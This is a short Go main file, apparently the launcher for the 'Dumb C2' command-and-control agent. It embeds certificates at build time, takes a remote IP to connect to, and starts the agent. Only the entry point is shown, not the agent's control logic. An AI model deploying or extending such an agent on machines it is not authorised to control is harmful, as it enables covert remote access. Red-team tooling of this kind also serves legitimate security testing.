//go:generate go get -u github.com/rakyll/statik
//go:generate bash -c "echo 'Please Copy Your Certs to buildtime/certs. '"
//go:generate bash -c "cd ../../; statik -m -f -src=buildtime/certs/ ; echo 'OK.'"

package main

import (
	"github.com/akamensky/argparse"
	"github.com/kmahyyg/dumbc2/buildtime"
	"github.com/kmahyyg/dumbc2/config"
	"github.com/kmahyyg/dumbc2/useri"
	"github.com/kmahyyg/dumbc2/utils"
	"os"
)

func main() {
	parser := argparse.NewParser(os.Args[0], "Dumb C2")
	laddr := parser.String("r", "remote", &argparse.Options{
		Required: true,
		Help:     "The IP You are gonna connect, default is your interface local IP.",
		Default:  utils.GetLocalIP(),
	})
	err := parser.Parse(os.Args)
	if err != nil {
		panic(err)
	}
	config.BuildUserOperation(*laddr, "")
	if buildtime.GetCertificates() != nil {
		panic("Certificate not exists. Generate first.")
	}
	useri.StartAgent(config.GlobalOP)
}
